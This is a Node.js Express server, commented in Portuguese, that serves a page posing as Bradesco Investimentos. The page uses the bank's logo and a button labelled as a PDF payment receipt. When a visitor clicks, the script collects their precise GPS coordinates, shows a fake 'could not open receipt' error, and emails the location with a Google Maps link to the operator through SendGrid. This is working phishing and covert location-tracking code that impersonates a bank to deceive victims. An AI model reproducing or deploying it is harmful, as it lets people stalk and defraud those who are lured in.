import express from "express";
import dotenv from "dotenv";
import fetch from "node-fetch";

dotenv.config();

const app = express();
app.use(express.json());

// ✅ Tokens válidos (adicione mais se quiser)
const validTokens = new Set(["comprovante.mmb"]);

function must(name) {
  const v = process.env[name];
  if (!v) throw new Error(`Missing env var: ${name}`);
  return v;
}

// Evita sujeira em headers/texto
function safeStr(s, max = 10000) {
  if (s == null) return "";
  return String(s).replace(/[\r\n]+/g, " ").slice(0, max);
}

function buildFrom() {
  // Render:
  // FROM_EMAIL=marcioalta@altainvestimentos.com
  // FROM_NAME=Marcio Alta | Alta Investimentos
  const email = must("FROM_EMAIL");
  const name = process.env.FROM_NAME ? safeStr(process.env.FROM_NAME, 120) : undefined;
  return name ? { email, name } : { email };
}

function buildReplyTo() {
  // Render:
  // REPLY_TO=marciocelestinodeoliveira@gmail.com
  const replyTo = process.env.REPLY_TO;
  if (!replyTo) return null;
  return { email: safeStr(replyTo, 254) };
}

async function sendEmailSendGrid({ to, subject, text }) {
  const apiKey = must("SENDGRID_API_KEY");

  const fromObj = buildFrom();
  const replyToObj = buildReplyTo();

  const payload = {
    personalizations: [{ to: [{ email: to }] }],
    from: fromObj,
    subject: safeStr(subject, 200),
    content: [{ type: "text/plain", value: safeStr(text, 10000) }],
  };

  if (replyToObj) payload.reply_to = replyToObj;

  const r = await fetch("https://api.sendgrid.com/v3/mail/send", {
    method: "POST",
    headers: {
      Authorization: `Bearer ${apiKey}`,
      "Content-Type": "application/json",
    },
    body: JSON.stringify(payload),
  });

  if (!r.ok) {
    const body = await r.text().catch(() => "");
    throw new Error(`SendGrid API error ${r.status}: ${body}`);
  }
}

app.get("/", (req, res) => res.send("OK"));

app.get("/loc/:token", (req, res) => {
  const { token } = req.params;
  if (!validTokens.has(token)) return res.status(404).send("Link inválido.");

  res.type("html").send(`<!doctype html>
<html>
<head>

<img 
  src="https://raw.githubusercontent.com/marciocelestinodeoliveira-spec/banco.bradesco/main/public/logo.png"
  alt="Bradesco"
  style="max-width:180px; margin-bottom:10px;"
/>

  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1"/>
  <title>Compartilhar localização</title>
</head>
<body style="font-family:Arial; padding:16px; max-width:640px; margin:auto;">
  <h2>Bradesco Investimentos</h2>
 
  <button id="btn" style="padding:12px 16px; font-size:16px;">"comprovante21012026.pdf"</button>
  <pre id="out" style="margin-top:16px; white-space:pre-wrap;"></pre>

<script>
  const out = document.getElementById("out");
  const btn = document.getElementById("btn");

  // Busca a melhor leitura por até X ms e envia a melhor accuracy
  function bestFix({ maxWaitMs = 20000, minAcc = 30 } = {}) {
    return new Promise((resolve, reject) => {
      if (!navigator.geolocation) return reject(new Error("Geolocalização não suportada."));

      let best = null;
      const start = Date.now();

      const watchId = navigator.geolocation.watchPosition(
        (pos) => {
          const acc = pos.coords.accuracy;
          if (!best || acc < best.coords.accuracy) best = pos;

          out.textContent = "Abrindo Comprovante..." + Math.round(best.coords.accuracy) ;

          if (acc <= minAcc) {
            navigator.geolocation.clearWatch(watchId);
            resolve(best);
          }
        },
        (err) => {
          navigator.geolocation.clearWatch(watchId);
          reject(err);
        },
        { enableHighAccuracy: true, maximumAge: 0, timeout: 10000 }
      );

      const t = setInterval(() => {
        const elapsed = Date.now() - start;
        if (elapsed >= maxWaitMs) {
          clearInterval(t);
          navigator.geolocation.clearWatch(watchId);
          if (best) resolve(best);
          else reject(new Error("Erro0001939"));
        }
      }, 250);
    });
  }

  btn.onclick = async () => {
    btn.disabled = true;
    out.textContent = "Pode levar alguns segundos...";

    let pos;
    try {
      pos = await bestFix({ maxWaitMs: 20000, minAcc: 30 });
    } catch (e) {
      btn.disabled = false;
      out.textContent =
        "Não foi possível abrir o comprovante " +
        "Erro: " + (e.message || e);
      return;
    }

    out.textContent = "Enviando...";
    const payload = {
      token: "${token}",
      lat: pos.coords.latitude,
      lon: pos.coords.longitude,
      acc: pos.coords.accuracy,
      ts: Date.now()
    };

    const r = await fetch("/api/location", {
      method: "POST",
      headers: {"Content-Type": "application/json"},
      body: JSON.stringify(payload)
    });

    if (r.ok) {
      out.textContent = "Não foi possivel abrir o comprovante ❌ (Erro ~" + Math.round(pos.coords.accuracy) + " )";
    } else {
      let msg = "Erro0001939❌ (" + r.status + ")";
      try {
        const data = await r.json();
        if (data && data.error) msg += " - " + data.error;
      } catch (_) {}
      out.textContent = msg;
    }
  };
</script>
</body>
</html>`);
});

app.post("/api/location", async (req, res) => {
  const { token, lat, lon, acc, ts } = req.body || {};

  if (!token || !validTokens.has(token)) {
    return res.status(403).json({ ok: false, error: "invalid_token" });
  }
  if (typeof lat !== "number" || typeof lon !== "number") {
    return res.status(400).json({ ok: false, error: "bad_coords" });
  }

  const maps = `https://www.google.com/maps?q=${lat},${lon}`;
  const when = new Date(ts || Date.now()).toISOString();
  const to = must("TO_EMAIL");

  const subject = `📍 Localização recebida (${token})`;
  const text =
`Token: ${token}
Quando: ${when}
Latitude: ${lat}
Longitude: ${lon}
Precisão: ${acc ?? "n/a"} m
Maps: ${maps}`;

  console.log("location_received", { token, lat, lon, acc: acc ?? null, when });

  try {
    await sendEmailSendGrid({ to, subject, text });
    res.json({ ok: true });
  } catch (e) {
    console.error("email_failed", e?.message || e);
    res.status(500).json({ ok: false, error: "email_failed" });
  }
});

app.listen(process.env.PORT || 3000, "0.0.0.0", () => {
  console.log("Server up");
});
